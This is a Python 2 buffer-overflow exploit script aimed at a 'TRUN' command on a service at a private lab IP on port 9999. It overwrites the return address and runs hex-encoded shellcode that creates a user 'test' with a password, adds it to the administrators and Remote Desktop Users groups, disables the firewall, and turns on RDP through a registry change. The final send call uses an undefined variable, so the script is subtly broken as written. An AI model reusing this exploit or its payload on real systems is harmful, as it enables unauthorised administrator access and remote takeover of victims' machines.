import socket
import struct

print "\nTRUN Command - Exploit, Add User/Enable RDP/Disable Firewall\n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    buf =  b""
    buf += "\x31\xd2\x52\x68\x64\x64\x20\x20\x68\x74\x20\x2f\x61\x68\x20\x74\x65\x73\x68\x65\x72\x73\x22\x68\x70\x20\x75\x73\x68\x73\x6b\x74\x6f\x68\x65\x20\x64\x65\x68\x65\x6d\x6f\x74\x68\x70\x20\x22\x52\x68\x67\x72\x6f\x75\x68\x6f\x63\x61\x6c\x68\x65\x74\x20\x6c\x68\x20\x26\x20\x6e\x68\x2f\x61\x64\x64\x68\x65\x73\x74\x20\x68\x72\x73\x20\x74\x68\x72\x61\x74\x6f\x68\x6e\x69\x73\x74\x68\x61\x64\x6d\x69\x68\x6f\x75\x70\x20\x68\x61\x6c\x67\x72\x68\x20\x6c\x6f\x63\x68\x20\x6e\x65\x74\x68\x64\x64\x20\x26\x68\x33\x20\x2f\x61\x68\x72\x64\x31\x32\x68\x73\x73\x77\x6f\x68\x74\x20\x50\x40\x68\x20\x74\x65\x73\x68\x75\x73\x65\x72\x68\x6e\x65\x74\x20\x89\xe3\x53\xba\xc7\x93\xc2\x77\xff\xd2\x31\xd2\x52\x68\x65\x20\x20\x20\x68\x73\x61\x62\x6c\x68\x65\x20\x64\x69\x68\x70\x6d\x6f\x64\x68\x65\x74\x20\x6f\x68\x6c\x6c\x20\x73\x68\x72\x65\x77\x61\x68\x68\x20\x66\x69\x68\x6e\x65\x74\x73\x89\xe3\x53\xba\xc7\x93\xc2\x77\xff\xd2\x31\xd2\x52\x68\x30\x20\x2f\x66\x68\x20\x2f\x64\x20\x68\x57\x4f\x52\x44\x68\x45\x47\x5f\x44\x68\x2f\x74\x20\x52\x68\x6f\x6e\x73\x20\x68\x65\x63\x74\x69\x68\x43\x6f\x6e\x6e\x68\x6e\x79\x54\x53\x68\x20\x66\x44\x65\x68\x22\x20\x2f\x76\x68\x72\x76\x65\x72\x68\x6c\x20\x53\x65\x68\x6d\x69\x6e\x61\x68\x5c\x54\x65\x72\x68\x74\x72\x6f\x6c\x68\x5c\x43\x6f\x6e\x68\x6c\x53\x65\x74\x68\x6e\x74\x72\x6f\x68\x6e\x74\x43\x6f\x68\x75\x72\x72\x65\x68\x45\x4d\x5c\x43\x68\x53\x59\x53\x54\x68\x49\x4e\x45\x5c\x68\x4d\x41\x43\x48\x68\x43\x41\x4c\x5f\x68\x59\x5f\x4c\x4f\x68\x22\x48\x4b\x45\x68\x61\x64\x64\x20\x68\x72\x65\x67\x20\x89\xe3\x53\xba\xc7\x93\xc2\x77\xff\xd2"
    
    evil_buf = "TRUN /.:/"
    evil_buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\x90'*32 + buf 

    bytes_sent = s.send(buffer)
    print "Sent %s bytes" % bytes_sent

finally:
    s.close()
